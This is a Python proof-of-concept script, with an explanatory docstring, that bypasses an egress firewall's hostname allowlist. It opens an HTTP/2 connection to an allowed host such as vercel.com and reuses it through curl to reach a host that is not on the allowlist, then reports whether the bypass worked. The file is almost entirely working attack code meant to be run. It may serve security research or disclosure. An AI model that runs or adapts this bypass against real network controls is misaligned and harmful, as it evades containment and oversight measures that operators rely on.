#!/usr/bin/env python3
"""
HTTP/2 connection-coalescing egress-firewall bypass PoC.

Usage:
    python poc.py <allowed_host> <target_host> [evidence_marker]

Background:
    An egress firewall enforces a hostname allowlist (e.g. "vercel.com")
    at TLS-connection time (SNI check). HTTP/2 permits a client to reuse
    an already-open connection for a different ":authority" as long as
    the presented certificate is valid for both hosts (RFC 7540 9.1.1),
    and many multi-tenant edges route purely on ":authority"/Host at L7
    regardless of which SNI opened the TLS session.

    That means: open a connection to the allowlisted host, then issue a
    second request on the SAME connection for a host that was never
    itself permitted through the firewall. No new TCP/TLS handshake is
    made for the second request, so the firewall's connect-time check
    never sees it.
"""
import subprocess

# EDIT THESE before pushing/running:
ALLOWED_HOST = "vercel.com"          # host permitted by the egress firewall's allowlist
TARGET_HOST = "example.com"          # host NOT on the allowlist, reached via connection reuse
EVIDENCE_MARKER = None               # optional: string expected only in TARGET_HOST's response


def main():
    allowed_host = ALLOWED_HOST
    target_host = TARGET_HOST
    evidence_marker = EVIDENCE_MARKER

    result = subprocess.run(
        [
            "curl", "-s", "-v", "--http2",
            f"https://{allowed_host}/",
            f"https://{target_host}/",
        ],
        capture_output=True, text=True,
    )

    print("--- curl -v (stderr) ---")
    print(result.stderr)
    print("--- response body(ies) (stdout) ---")
    print(result.stdout)

    reused = "Re-using existing connection" in result.stderr
    print(f"[i] connection reused across hosts: {reused}")

    if evidence_marker:
        found = evidence_marker in result.stdout
        print(f"[i] evidence marker '{evidence_marker}' present in response: {found}")
        if reused and found:
            print(f"[+] firewall bypass confirmed: reached {target_host} via {allowed_host} pivot")


if __name__ == "__main__":
    main()
